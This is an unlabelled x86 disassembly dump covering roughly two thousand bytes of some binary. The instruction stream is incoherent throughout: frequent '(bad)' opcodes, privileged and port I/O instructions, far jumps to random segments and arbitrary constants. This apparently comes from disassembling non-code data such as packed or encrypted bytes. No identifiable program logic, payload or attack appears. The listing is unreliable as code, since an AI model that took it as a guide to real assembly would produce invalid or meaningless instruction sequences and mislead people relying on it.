  415dcd:	inc    eax
  415dce:	icebp  
  415dcf:	(bad)  
  415dd0:	push   ebx
  415dd1:	sbb    BYTE PTR [esi],cl
  415dd3:	dec    edx
  415dd4:	lds    ebp,FWORD PTR [edi+0x4c]
  415dd7:	dec    ebp
  415dd8:	inc    esp
  415dd9:	enter  0x1d31,0x28
  415ddd:	int    0xbe
  415ddf:	mov    DWORD PTR [ecx-0x59a9b58f],edx
  415de5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415de6:	jo     0x415dd8
  415de8:	dec    edi
  415de9:	inc    eax
  415dea:	loope  0x415e55
  415dec:	out    dx,al
  415ded:	push   ebp
  415dee:	les    esi,FWORD PTR [ebp-0x5116b6d2]
  415df4:	or     eax,0xbef61bb9
  415df9:	push   cs
  415dfa:	retf   0xc010
  415dfd:	loope  0x415e52
  415dff:	into   
  415e00:	dec    eax
  415e01:	test   al,0x2c
  415e03:	sub    ebx,DWORD PTR [ecx]
  415e05:	mov    ebp,0x2e45afd8
  415e0a:	imul   ebp,edi,0xdf3965db
  415e10:	je     0x415e42
  415e12:	push   ebp
  415e13:	(bad)  
  415e14:	(bad)  
  415e15:	mov    ch,dh
  415e17:	scas   al,BYTE PTR es:[edi]
  415e18:	xchg   BYTE PTR [edx],cl
  415e1a:	ins    BYTE PTR es:[edi],dx
  415e1b:	and    DWORD PTR [ecx+edi*4-0x2ad5ae2d],eax
  415e22:	and    esp,edi
  415e24:	dec    esi
  415e25:	das    
  415e26:	mov    ebx,0xb5657a3
  415e2b:	das    
  415e2c:	lods   eax,DWORD PTR ds:[esi]
  415e2d:	jle    0x415dde
  415e2f:	cmp    al,0x6c
  415e31:	pop    edi
  415e32:	daa    
  415e33:	sub    BYTE PTR [esi+0x25],dh
  415e36:	add    al,0x4d
  415e38:	call   0x1074:0x35d01a92
  415e3f:	ja     0x415e0b
  415e41:	mov    esp,0x56de9e38
  415e46:	ret    0x68cb
  415e49:	fcmovu st,st(5)
  415e4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415e4c:	xor    ebx,DWORD PTR [ecx]
  415e4e:	cs jae 0x415e3e
  415e51:	mov    eax,0xbf37a3f4
  415e56:	icebp  
  415e57:	mov    esi,DWORD PTR [eax]
  415e59:	test   al,0x9a
  415e5b:	push   0x90c99e36
  415e60:	inc    ecx
  415e61:	sub    DWORD PTR ds:0xdb26cdc,0x6a
  415e68:	xor    eax,0xeebedbc6
  415e6d:	lock leave 
  415e6f:	fst    QWORD PTR [eax]
  415e71:	gs sbb dh,cl
  415e74:	push   eax
  415e75:	pop    ecx
  415e76:	push   esi
  415e77:	mov    ecx,0xac6c403
  415e7c:	push   ss
  415e7d:	or     DWORD PTR [esi],ecx
  415e7f:	ja     0x415e8c
  415e81:	and    eax,0x146d8f4a
  415e86:	push   ds
  415e87:	or     eax,0xaf4c4caa
  415e8c:	repnz mov bh,0x30
  415e8f:	adc    BYTE PTR [edi+ecx*8],dh
  415e92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415e93:	jle    0x415eef
  415e95:	push   0xffffff86
  415e97:	fisttp QWORD PTR [esi+esi*2-0x5566e0fc]
  415e9e:	push   ecx
  415e9f:	stos   DWORD PTR es:[edi],eax
  415ea0:	in     eax,0x7e
  415ea2:	dec    ecx
  415ea3:	leave  
  415ea4:	push   ebp
  415ea5:	add    DWORD PTR [ebx],esp
  415ea7:	sbb    al,0xa1
  415ea9:	inc    edx
  415eaa:	xor    al,0x22
  415eac:	sub    edi,ebp
  415eae:	adc    BYTE PTR [eax],ch
  415eb0:	outs   dx,BYTE PTR ds:[esi]
  415eb1:	dec    eax
  415eb2:	idiv   ecx
  415eb4:	mov    bl,0x89
  415eb6:	aad    0x1c
  415eb8:	out    dx,al
  415eb9:	sbb    eax,ebx
  415ebb:	(bad)  
  415ebc:	pop    eax
  415ebd:	mov    BYTE PTR [ecx-0x51],al
  415ec0:	repnz inc ecx
  415ec2:	in     eax,dx
  415ec3:	dec    edi
  415ec4:	pop    ebx
  415ec5:	xchg   esp,eax
  415ec6:	sub    edx,DWORD PTR [eax-0xc4e5cee]
  415ecc:	add    BYTE PTR [edi],0x15
  415ecf:	inc    ecx
  415ed0:	cmp    edx,eax
  415ed2:	ror    cl,0xb2
  415ed5:	cmp    al,0x21
  415ed7:	lds    ebp,FWORD PTR [ebx+0x21]
  415eda:	cmc    
  415edb:	fs push ds
  415edd:	mov    esi,0x3bbe0542
  415ee3:	int3   
  415ee4:	and    DWORD PTR [ecx-0x2],edx
  415ee7:	fistp  DWORD PTR [ebp-0x34]
  415eea:	(bad)  
  415eeb:	int3   
  415eec:	(bad)  
  415eed:	jl     0x415f08
  415eef:	loopne 0x415e8c
  415ef1:	push   ebx
  415ef2:	rcl    ebp,1
  415ef4:	mov    ebx,0xcb3148aa
  415ef9:	xchg   ecx,eax
  415efa:	je     0x415e8c
  415efc:	mov    esp,0x4a4e6ea4
  415f01:	loop   0x415f0f
  415f03:	cmp    ah,BYTE PTR [eax]
  415f05:	push   esi
  415f06:	jne    0x415f5c
  415f08:	push   es
  415f09:	popf   
  415f0a:	imul   ebx,DWORD PTR [ecx-0x5f842a5e],0x7159b472
  415f14:	rcl    BYTE PTR [ebx-0x62dcba7d],cl
  415f1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f1b:	push   0xffffff9c
  415f1d:	adc    DWORD PTR [eax],esp
  415f1f:	(bad)  [edi+0x53]
  415f22:	xchg   ebp,eax
  415f23:	push   cs
  415f24:	mov    ebx,0xa9a07d2e
  415f29:	cdq    
  415f2a:	sbb    eax,0x8a71d487
  415f2f:	jnp    0x415f9d
  415f31:	gs inc eax
  415f33:	inc    ebx
  415f34:	push   eax
  415f35:	loope  0x415f40
  415f37:	mov    ah,0x4d
  415f39:	mov    edi,0xcf0243de
  415f3e:	push   edi
  415f3f:	ror    DWORD PTR [edx],0x79
  415f42:	nop
  415f43:	lods   al,BYTE PTR ds:[esi]
  415f44:	inc    esi
  415f45:	popa   
  415f46:	ret    
  415f47:	cwde   
  415f48:	fxch   st(3)
  415f4a:	mov    BYTE PTR [edx],dl
  415f4c:	outs   dx,BYTE PTR ds:[esi]
  415f4d:	and    dl,dl
  415f4f:	scas   eax,DWORD PTR es:[edi]
  415f50:	mov    esp,0xc7d479da
  415f55:	leave  
  415f56:	jp     0x415f82
  415f58:	add    BYTE PTR [edx-0x239cf44b],dh
  415f5e:	pop    ss
  415f5f:	mov    ds:0xc1decb4e,eax
  415f64:	mov    dl,0xe7
  415f66:	mov    ds:0xaf5d5267,al
  415f6b:	mov    ebx,0xa88defad
  415f70:	stc    
  415f71:	enter  0x66fe,0x24
  415f75:	aas    
  415f76:	in     eax,0xe8
  415f78:	out    dx,al
  415f79:	fidivr WORD PTR [eax-0x1]
  415f7c:	pop    esi
  415f7d:	lea    ecx,[ebx]
  415f7f:	sbb    al,0x62
  415f81:	mov    edx,DWORD PTR [edi+0x98072fe]
  415f87:	not    DWORD PTR [eax+0x23]
  415f8a:	push   0xe9d0e7ed
  415f8f:	sub    ch,0xaf
  415f92:	pop    es
  415f93:	add    BYTE PTR [edi+0x4381b55c],dh
  415f99:	leave  
  415f9a:	dec    ebp
  415f9b:	jns    0x415fdb
  415f9d:	cdq    
  415f9e:	fldenv [edx+0x2f]
  415fa1:	fmul   DWORD PTR [ebx-0x32]
  415fa4:	mov    edx,0x750f3e43
  415fa9:	loop   0x415f76
  415fab:	mov    ch,0x3a
  415fad:	sbb    al,0x2
  415faf:	inc    esi
  415fb0:	or     al,0x57
  415fb2:	into   
  415fb3:	mov    ds:0xe486123d,eax
  415fb8:	test   eax,0xdb2e4336
  415fbd:	adc    BYTE PTR [ebx+eiz*4-0x123db8c6],al
  415fc4:	neg    DWORD PTR [edi-0x75]
  415fc7:	ins    BYTE PTR es:[edi],dx
  415fc8:	inc    esp
  415fc9:	jb     0x416048
  415fcb:	push   cs
  415fcc:	dec    edx
  415fcd:	adc    eax,0xc635c1ca
  415fd2:	inc    edi
  415fd3:	dec    esp
  415fd4:	lock sbb dh,ch
  415fd7:	push   edx
  415fd8:	sti    
  415fd9:	aas    
  415fda:	jl     0x415fb6
  415fdc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415fdd:	inc    ebx
  415fde:	jmp    0xdf27:0x40b93779
  415fe5:	pusha  
  415fe6:	ins    DWORD PTR es:[edi],dx
  415fe7:	stos   BYTE PTR es:[edi],al
  415fe8:	mov    cl,0xd7
  415fea:	xchg   ebx,eax
  415feb:	pusha  
  415fec:	enter  0xcdc4,0xc5
  415ff0:	mov    ebp,0xd3d34f85
  415ff5:	cmp    esp,DWORD PTR [edx-0x35bad56b]
  415ffb:	mov    esp,0x9e8a0eed
  416000:	xchg   esp,ebx
  416002:	mov    WORD PTR [ecx-0x1f5128bf],cs
  416008:	test   DWORD PTR [ecx-0x69],esi
  41600b:	in     eax,dx
  41600c:	in     al,dx
  41600d:	xchg   esi,eax
  41600e:	out    dx,al
  41600f:	mov    ecx,DWORD PTR [ecx-0x58]
  416012:	fimul  WORD PTR [esp+ecx*8-0x56]
  416016:	cdq    
  416017:	and    eax,0x6fe56134
  41601c:	scas   al,BYTE PTR es:[edi]
  41601d:	push   es
  41601e:	(bad)  
  41601f:	and    ah,BYTE PTR [eax+eax*2-0x69]
  416023:	cmc    
  416024:	xchg   ecx,eax
  416025:	xchg   esp,eax
  416026:	mov    ah,0xda
  416028:	mov    cl,0x38
  41602a:	jp     0x41604b
  41602c:	call   0xe660c3af
  416031:	int    0xc2
  416033:	sbb    ebp,edx
  416035:	inc    eax
  416036:	arpl   cx,cx
  416038:	sbb    dh,cl
  41603a:	add    ebp,DWORD PTR [edx-0x2]
  41603d:	xchg   edi,eax
  41603e:	mov    edx,0x93e5692d
  416043:	sub    DWORD PTR ss:[ecx+0x1ba41475],edx
  41604a:	add    cl,BYTE PTR [esi+0x58]
  41604d:	test   al,0xb8
  41604f:	(bad)  
  416050:	cli    
  416051:	dec    edi
  416052:	mov    DWORD PTR [ebx+edi*2+0x72],esi
  416056:	mov    ds:0xbfc032a3,eax
  41605b:	and    BYTE PTR [ebx+0x56e4d192],dh
  416061:	mov    esp,0xb4d0af4a
  416066:	callw  0x6feb
  41606a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41606b:	(bad)  
  41606c:	cmp    bl,bl
  41606e:	adc    BYTE PTR [edi+0x25],al
  416071:	xchg   ebp,eax
  416072:	repnz add ecx,ecx
  416075:	and    al,0xac
  416077:	ficomp WORD PTR [esi]
  416079:	dec    edi
  41607a:	jae    0x41603e
  41607c:	push   esp
  41607d:	je     0x4160dc
  41607f:	pushf  
  416080:	fdivr  QWORD PTR [esi]
  416082:	push   edi
  416083:	clc    
  416084:	sub    eax,0x90283a49
  416089:	jns    0x41609d
  41608b:	ret    
  41608c:	test   al,0x88
  41608e:	lds    esi,FWORD PTR [edx]
  416090:	xchg   edi,eax
  416091:	mov    bh,0xff
  416093:	ror    DWORD PTR [edx],1
  416095:	xlat   BYTE PTR ds:[ebx]
  416096:	jmp    0xf2361ce3
  41609b:	div    BYTE PTR [eax+eax*8]
  41609e:	nop
  41609f:	cld    
  4160a0:	(bad)  
  4160a1:	pusha  
  4160a2:	sub    eax,0x1003e85a
  4160a7:	les    esi,FWORD PTR [ebx]
  4160a9:	icebp  
  4160aa:	leave  
  4160ab:	nop
  4160ac:	or     al,0xea
  4160ae:	fld    QWORD PTR [ecx+0x54a7a55e]
  4160b4:	and    eax,0xfede310c
  4160b9:	fsubr  QWORD PTR ds:0xbc1b16b2
  4160bf:	xchg   ebp,eax
  4160c0:	add    eax,0x64b01968
  4160c5:	cmp    esp,eax
  4160c7:	fucomip st,st(2)
  4160c9:	repz ret 
  4160cb:	stos   DWORD PTR es:[edi],eax
  4160cc:	push   0x24
  4160ce:	jns    0x4160b9
  4160d0:	mov    ebx,0x48061840
  4160d5:	out    dx,al
  4160d6:	add    esi,DWORD PTR [ebx+esi*1]
  4160d9:	adc    BYTE PTR [ecx-0x24b3496d],al
  4160df:	mov    edx,0xec1009ac
  4160e4:	and    BYTE PTR [ebp+0x3e],dh
  4160e7:	and    ecx,ecx
  4160e9:	retf   0xa623
  4160ec:	or     DWORD PTR [ebp-0x16],0xeb03d8cc
  4160f3:	dec    edi
  4160f4:	mov    ebx,0xca8e1c33
  4160f9:	dec    edi
  4160fa:	mov    edx,0x5293a64c
  4160ff:	push   edx
  416100:	call   0x89556c40
  416105:	int3   
  416106:	aad    0xe9
  416108:	and    DWORD PTR [esi],esp
  41610a:	(bad)  
  41610b:	enter  0xfe8b,0xac
  41610f:	test   BYTE PTR [edi],dl
  416111:	dec    esi
  416112:	xchg   eax,ebp
  416114:	cmp    BYTE PTR [eax],bh
  416116:	test   BYTE PTR [edx+0x52],ch
  416119:	fs in  al,dx
  41611b:	mov    ds:0xe6889d6e,al
  416120:	adc    al,0x11
  416122:	mov    eax,0x309e751f
  416127:	test   eax,0xd82e8ded
  41612c:	cdq    
  41612d:	sahf   
  41612e:	ds dec ebp
  416130:	inc    ebx
  416131:	pop    edi
  416132:	bound  ecx,QWORD PTR [ebx+0x3f]
  416135:	aam    0xb6
  416137:	mov    edx,0xbdc085ec
  41613c:	repz cld 
  41613e:	outs   dx,DWORD PTR ds:[esi]
  41613f:	jmp    0x6a2b8df8
  416144:	lock sub DWORD PTR [edi-0x57],eax
  416148:	sub    edx,DWORD PTR [esi+0x2]
  41614b:	icebp  
  41614c:	ins    DWORD PTR es:[edi],dx
  41614d:	or     bl,cl
  41614f:	pop    ss
  416150:	and    al,0x3
  416152:	pusha  
  416153:	xor    DWORD PTR [edi+0x23],ebx
  416156:	xchg   BYTE PTR [edx-0x2a],ch
  416159:	(bad)  
  41615a:	cmp    ebx,DWORD PTR [ecx+0x1afae5e2]
  416160:	dec    edx
  416161:	add    DWORD PTR [ebx+0x5],ecx
  416164:	fild   QWORD PTR [esi+ebp*1+0x5be0deae]
  41616b:	push   0xffffffa3
  41616d:	jmp    0x9c79:0x7a325303
  416174:	xchg   BYTE PTR [eax],bh
  416176:	loope  0x4161ce
  416178:	mov    ecx,0x26fafc16
  41617d:	bound  eax,QWORD PTR [esi]
  41617f:	sar    DWORD PTR [edx-0x80],1
  416182:	xchg   esp,eax
  416183:	jg     0x4161c2
  416185:	mov    ebp,ecx
  416187:	test   DWORD PTR [edi+0x38e68366],0x6de4f9ef
  416191:	mov    ebp,0x7d945d2e
  416196:	and    DWORD PTR [edx-0x20],0xffffff95
  41619a:	sbb    BYTE PTR [esp+ecx*4-0x3e1fcccc],cl
  4161a1:	jae    0x416171
  4161a3:	jle    0x4161e9
  4161a5:	xchg   BYTE PTR [esi+0x3a36891d],dh
  4161ab:	stc    
  4161ac:	push   edx
  4161ad:	das    
  4161ae:	cmp    dh,BYTE PTR [eax-0x40]
  4161b1:	add    eax,0x46ed0df4
  4161b6:	pop    es
  4161b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4161b8:	(bad)  
  4161b9:	jmp    0x4161de
  4161bb:	push   cs
  4161bc:	push   es
  4161bd:	dec    esp
  4161be:	ins    DWORD PTR es:[edi],dx
  4161bf:	push   0x1b0f26e7
  4161c4:	jo     0x416180
  4161c6:	(bad)  
  4161c7:	pop    ds
  4161c8:	mov    dh,0xb3
  4161ca:	and    dl,BYTE PTR [edi+0x3702dd51]
  4161d0:	inc    eax
  4161d1:	fmul   DWORD PTR [ebp+0x67]
  4161d4:	maskmovq mm0,(bad)
  4161d5:	test   DWORD PTR [ebp+0x22e2b695],0xe03e9688
  4161df:	ss dec edi
  4161e1:	dec    ebp
  4161e2:	nop
  4161e3:	xor    dl,BYTE PTR [ecx+0x7e138055]
  4161e9:	xor    eax,0x662e940
  4161ee:	test   al,0x1c
  4161f0:	test   BYTE PTR [eax],dh
  4161f2:	sbb    al,0xef
  4161f5:	lahf   
  4161f6:	sbb    al,0xa9
  4161f8:	dec    eax
  4161f9:	stc    
  4161fa:	jecxz  0x416276
  4161fc:	dec    ecx
  4161fd:	and    ebx,DWORD PTR [eax+0x51]
  416200:	pop    edi
  416201:	xor    esp,DWORD PTR [ecx]
  416203:	or     al,0x23
  416205:	cwde   
  416206:	into   
  416207:	push   edi
  416208:	sbb    eax,DWORD PTR [esi]
  41620a:	pop    ds
  41620b:	dec    esi
  41620c:	mov    al,ds:0xd288ad41
  416211:	or     eax,0xaf0d6da3
  416216:	fdivp  st(1),st
  416218:	test   BYTE PTR ds:0xd7990886,al
  41621e:	mov    bl,dl
  416220:	inc    esp
  416221:	add    dh,al
  416223:	add    BYTE PTR [eax],dl
  416225:	xchg   esp,eax
  416226:	pushf  
  416227:	cmp    eax,0x4b646feb
  41622c:	sbb    esi,DWORD PTR [ebx-0x1b90eedf]
  416232:	out    0xd2,al
  416234:	rcr    BYTE PTR [ecx],cl
  416236:	mov    edi,0x3ddc8425
  41623b:	lods   eax,DWORD PTR ds:[esi]
  41623c:	push   0x4b074fd6
  416241:	(bad)  
  416242:	shr    ah,0x94
  416245:	add    eax,0x4ca95964
  41624a:	xchg   dl,dl
  41624c:	inc    edi
  41624d:	mov    al,0x55
  41624f:	hlt    
  416250:	cs pop edx
  416252:	fstp   QWORD PTR [esi+edx*1+0x1171434e]
  416259:	shl    BYTE PTR [edx],0xb0
  41625c:	jbe    0x4161e5
  41625e:	mov    ds:0x2fe85e03,al
  416263:	lds    ebx,FWORD PTR [edi-0x74]
  416266:	(bad)  
  416267:	shr    dl,cl
  416269:	repz cld 
  41626b:	(bad)  
  41626d:	inc    edx
  41626e:	mov    ss,WORD PTR [ecx-0x7e]
  416271:	jg     0x41627f
  416273:	cmp    BYTE PTR [ebx-0x6c41a45f],ch
  416279:	fs xchg esp,eax
  41627b:	in     al,0xbf
  41627d:	aam    0xfc
  41627f:	inc    esp
  416280:	mov    dl,0xa6
  416282:	xor    BYTE PTR [esi-0x1d],cl
  416285:	inc    cl
  416287:	mov    al,0x45
  416289:	aaa    
  41628a:	mov    ?,WORD PTR [ebp-0x42c7d79b]
  416290:	fisub  DWORD PTR [edi+0x40]
  416293:	aas    
  416294:	or     DWORD PTR [edx+0x5a],0x6c03633a
  41629b:	fisub  DWORD PTR [edi+0x39d5f0ca]
  4162a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4162a2:	or     DWORD PTR [esi],edx
  4162a4:	popf   
  4162a5:	ja     0x4162e3
  4162a7:	lods   al,BYTE PTR ds:[esi]
  4162a8:	js     0x416292
  4162aa:	cmp    DWORD PTR [ecx+0x381dd328],edi
  4162b0:	and    al,0x6a
  4162b2:	into   
  4162b3:	shl    BYTE PTR [edx-0x35],1
  4162b6:	inc    esp
  4162b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4162b8:	xor    ah,BYTE PTR [edx]
  4162ba:	imul   esi,DWORD PTR [esi+0x22],0x3
  4162be:	(bad)  
  4162c0:	stos   DWORD PTR es:[edi],eax
  4162c1:	lods   eax,DWORD PTR ds:[esi]
  4162c2:	cmp    ebp,DWORD PTR [ecx-0x71]
  4162c5:	sub    al,0xfd
  4162c7:	push   ecx
  4162c8:	jmp    0x4162e8
  4162ca:	daa    
  4162cb:	jnp    0x4162ab
  4162cd:	push   ds
  4162ce:	lods   al,BYTE PTR ds:[esi]
  4162cf:	fcomp  DWORD PTR [edi]
  4162d1:	es cmp al,0x41
  4162d4:	jnp    0x416290
  4162d6:	idiv   DWORD PTR [edx-0x2df6649b]
  4162dc:	neg    DWORD PTR [ebp-0x38]
  4162df:	jmp    0x162b:0x746f61db
  4162e6:	out    dx,al
  4162e7:	pusha  
  4162e8:	aam    0xb9
  4162ea:	mov    ds:0xfd79f44,al
  4162ef:	loop   0x416313
  4162f1:	call   DWORD PTR [eax]
  4162f3:	fbstp  TBYTE PTR [edi+0x1b06c77c]
  4162f9:	int    0x1e
  4162fb:	xchg   esp,eax
  4162fc:	popa   
  4162fd:	ror    DWORD PTR [edx-0x4f56755a],cl
  416303:	mov    al,ds:0x441f3e3e
  416308:	adc    DWORD PTR [eax],esi
  41630a:	and    al,0xe8
  41630c:	in     eax,0x92
  41630e:	int    0xce
  416310:	xor    al,0xb6
  416312:	cdq    
  416313:	js     0x41629c
  416315:	out    dx,al
  416316:	aam    0xbb
  416318:	bound  edi,QWORD PTR [esi]
  41631a:	sub    DWORD PTR [ecx+0x1d75d349],0xffffffe0
  416321:	int    0x8f
  416323:	push   ebx
  416324:	jecxz  0x4162e3
  416326:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416327:	add    eax,0x38aac64
  41632c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41632d:	test   bl,bh
  41632f:	jecxz  0x41633a
  416331:	push   ds
  416332:	inc    esi
  416333:	call   0x3200:0x4c9f997d
  41633a:	mov    ebx,0x29246ccf
  41633f:	into   
  416340:	mov    BYTE PTR [ebp-0x17ca58c8],ah
  416346:	call   0x58e6ecb
  41634b:	adc    bh,BYTE PTR [ecx+0x482fd55a]
  416351:	mov    ebp,0x967850d1
  416356:	inc    esi
  416357:	inc    esp
  416358:	pop    ebp
  416359:	mov    ebp,gs
  41635b:	in     eax,0xd8
  41635d:	sub    bl,BYTE PTR [ecx]
  41635f:	xlat   BYTE PTR ds:[ebx]
  416360:	push   dx
  416362:	xchg   ecx,eax
  416363:	bound  eax,QWORD PTR [ebx]
  416365:	cmp    edi,DWORD PTR [ecx+0x62]
  416368:	lds    ecx,FWORD PTR [edi]
  41636a:	xchg   ecx,eax
  41636b:	js     0x416309
  41636d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41636e:	(bad)  
  41636f:	xlat   BYTE PTR ds:[ebx]
  416370:	inc    edi
  416371:	ret    0x4a41
  416374:	mov    cr1,ebx
  416377:	jb     0x4163b0
  416379:	mov    cl,ch
  41637b:	ror    BYTE PTR ds:0x42ee702f,cl
  416381:	sbb    bl,bl
  416383:	test   eax,0xdead2ada
  416388:	out    dx,eax
  416389:	(bad)  
  41638a:	sub    DWORD PTR cs:0xb93e2235,eax
  416391:	push   ebx
  416392:	sbb    al,0xb3
  416394:	retf   
  416395:	addr16 leave 
  416397:	dec    esp
  416398:	jecxz  0x416323
  41639a:	mov    eax,ds:0x6212cf6b
  41639f:	int3   
  4163a0:	jae    0x4163a1
  4163a2:	in     al,dx
  4163a3:	gs test eax,0x4b5292e9
  4163a9:	out    0x74,al
  4163ab:	cmp    al,ah
  4163ad:	test   eax,0xf1ac364d
  4163b2:	mov    ebx,0x1a0b28f4
  4163b7:	scas   al,BYTE PTR es:[edi]
  4163b8:	arpl   WORD PTR [ebx-0x76],dx
  4163bb:	xchg   ebp,eax
  4163bc:	into   
  4163bd:	inc    esp
  4163be:	xabort 0x3e
  4163c1:	inc    eax
  4163c2:	jmp    0x4163e1
  4163c4:	lahf   
  4163c5:	jo     0x4163cd
  4163c7:	sahf   
  4163c8:	mov    ds:0x31b1bba0,al
  4163cd:	out    0x54,eax
  4163cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4163d0:	mov    DWORD PTR [edi-0x317ac180],ebp
  4163d6:	pop    ebx
  4163d7:	dec    ecx
  4163d8:	stc    
  4163d9:	pop    edi
  4163da:	stos   BYTE PTR es:[edi],al
  4163db:	or     ch,BYTE PTR [ebx]
  4163dd:	sub    ebx,DWORD PTR [eax+0x753a0a45]
  4163e3:	cmc    
  4163e4:	data16 daa 
  4163e6:	sbb    dh,BYTE PTR [ebp+ecx*8+0x1472a685]
  4163ed:	pushf  
  4163ee:	sbb    edx,DWORD PTR [ebp+0x65264669]
  4163f4:	dec    ebp
  4163f5:	faddp  st(4),st
  4163f7:	push   ebp
  4163f8:	pop    ebp
  4163f9:	add    cl,BYTE PTR [edi]
  4163fb:	xchg   edx,eax
  4163fc:	sar    DWORD PTR [esi+0x74],cl
  4163ff:	pop    ebp
  416400:	fistp  WORD PTR ds:0xeed40933
  416406:	or     BYTE PTR [esi+0x1ff4f7b],bl
  41640c:	fimul  DWORD PTR [eax-0x1c]
  41640f:	(bad)  
  416410:	sti    
  416411:	jl     0x41648b
  416413:	lea    edx,es:[eax-0x56]
  416417:	xchg   DWORD PTR [esi+0x26acdb58],edx
  41641d:	in     eax,0x3c
  41641f:	cmp    ecx,DWORD PTR [edi]
  416421:	or     eax,0xde2b5332
  416426:	xor    edi,ebp
  416428:	xchg   DWORD PTR gs:[ebx],eax
  41642b:	xchg   ebx,eax
  41642c:	sti    
  41642d:	dec    ecx
  41642e:	mov    ah,0xda
  416430:	stos   DWORD PTR es:[edi],eax
  416431:	or     al,0xc7
  416433:	in     eax,dx
  416434:	add    al,0x97
  416436:	arpl   bp,ax
  416438:	push   edx
  416439:	mov    bh,0x4d
  41643b:	and    eax,0xca1ae97d
  416440:	pop    ds
  416441:	jmp    0xae85:0xaa0fea5b
  416448:	lea    ecx,[ebp-0x3cda66bf]
  41644e:	imul   esp,DWORD PTR [ecx-0x79],0xffffff95
  416452:	cld    
  416453:	cmp    DWORD PTR ds:0xe13ce3f,edx
  416459:	in     eax,dx
  41645a:	jl     0x416457
  41645c:	or     al,0xf1
  41645e:	js     0x4164b1
  416460:	iret   
  416461:	test   al,0x98
  416463:	sub    DWORD PTR [edx-0x45d62b0b],ebp
  416469:	jb     0x416445
  41646b:	push   edx
  41646c:	iret   
  41646d:	pusha  
  41646e:	mov    dl,0x4b
  416470:	cwde   
  416471:	mov    esi,0xd25b258
  416476:	jns    0x41643e
  416478:	ins    DWORD PTR es:[edi],dx
  416479:	cli    
  41647a:	pop    ss
  41647b:	adc    BYTE PTR [ebx],al
  41647d:	shl    BYTE PTR [ecx-0x3f0c1a45],0xad
  416484:	inc    ecx
  416485:	inc    edx
  416486:	ja     0x4164ac
  416488:	jb     0x4164cb
  41648a:	xor    al,0x87
  41648c:	cwde   
  41648d:	dec    DWORD PTR [eax+0x5c]
  416490:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416491:	shl    DWORD PTR fs:[ecx+0x34],1
  416495:	lahf   
  416496:	stos   DWORD PTR es:[edi],eax
  416497:	xchg   ecx,eax
  416498:	dec    ebx
  416499:	and    ebx,0x71
  41649c:	je     0x416483
  41649e:	lds    esp,FWORD PTR ds:0xaa7d794a
  4164a4:	mov    ebp,0x35ffb462
  4164a9:	fwait
  4164aa:	mov    ecx,0x8a6f747a
  4164af:	popa   
  4164b0:	clc    
  4164b1:	inc    ebx
  4164b2:	inc    ecx
  4164b3:	cwde   
  4164b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4164b5:	push   es
  4164b6:	and    ebx,DWORD PTR [edx-0x2c493aa0]
  4164bc:	div    BYTE PTR [ebx-0x72]
  4164bf:	in     al,dx
  4164c0:	cwde   
  4164c1:	scas   eax,DWORD PTR es:[edi]
  4164c2:	push   eax
  4164c3:	or     ah,BYTE PTR [ecx-0x582da57]
  4164c9:	in     eax,dx
  4164ca:	cli    
  4164cb:	scas   eax,DWORD PTR es:[edi]
  4164cc:	repnz sub esp,eax
  4164cf:	imul   esp,DWORD PTR [esi+0x5c],0x1a
  4164d3:	add    al,bh
  4164d5:	call   0x4e2159bf
  4164da:	sahf   
  4164db:	mov    esi,0x37eba96f
  4164e0:	(bad)  
  4164e1:	and    ax,0xfe65
  4164e5:	fimul  WORD PTR [ebx]
  4164e7:	dec    eax
  4164e8:	jb     0x41652c
  4164ea:	cld    
  4164eb:	mov    edx,0xdcb9036d
  4164f0:	scas   al,BYTE PTR es:[edi]
  4164f1:	shl    ch,cl
  4164f3:	push   ss
  4164f4:	scas   al,BYTE PTR es:[edi]
  4164f5:	(bad)  
  4164f6:	clc    
  4164f7:	scas   eax,DWORD PTR es:[edi]
  4164f8:	adc    DWORD PTR ds:0xd5fe0089,0x5e
  4164ff:	shl    DWORD PTR [ecx+0x30aa5dee],cl
  416505:	push   ds
  416506:	cmp    BYTE PTR [esi],al
  416508:	cld    
  416509:	jmp    0x4164a3
  41650b:	out    0x54,al
  41650d:	pop    esp
  41650e:	mov    WORD PTR [ebx+0x2c3e1cb],fs
  416514:	push   cs
  416515:	fidiv  DWORD PTR [edi+0x52]
  416518:	jp     0x416596
  41651a:	pop    edx
  41651b:	(bad)  
  41651c:	pop    ebp
  41651d:	leave  
  41651e:	mov    bh,0x9b
  416520:	mov    dh,0xf7
  416522:	aam    0x7f
  416524:	jne    0x41651b
  416526:	pop    ds
  416527:	push   cs
  416528:	in     eax,0x41
  41652a:	jmp    0xf7c1f023
  41652f:	inc    edi
  416530:	loop   0x416525
  416532:	xchg   edi,eax
  416533:	mov    dh,0xa0
  416535:	push   edi
  416536:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416537:	icebp  
  416538:	test   al,0xad
  41653a:	aam    0xf6
  41653c:	mov    edi,0x6b454d68
  416541:	scas   eax,DWORD PTR es:[edi]
  416542:	imul   edx,esi,0x21
  416545:	sar    BYTE PTR [eax],cl
  416547:	and    DWORD PTR [ebp+0x2639234a],esp
  41654d:	xchg   DWORD PTR [ebp+eax*4+0x1f20733e],esi
  416554:	loop   0x41656d
  416556:	push   edx
  416557:	or     ah,BYTE PTR [ecx-0x5a9bf3f]
  41655d:	enter  0xc643,0x8c
  416561:	icebp  
  416562:	jmp    0x85b6:0x60ebf1d2
  416569:	popf   
  41656a:	or     bh,BYTE PTR [edi+0x2f]
  41656d:	push   edi
  41656e:	sub    ecx,ebx
  416570:	push   ebx
  416571:	jae    0x416501
  416573:	fs cld 
  416575:	mov    eax,0x1763a348
  41657a:	jb     0x4165a1
  41657c:	imul   edx,ebp,0x588d9106
  416582:	mov    ah,0x34
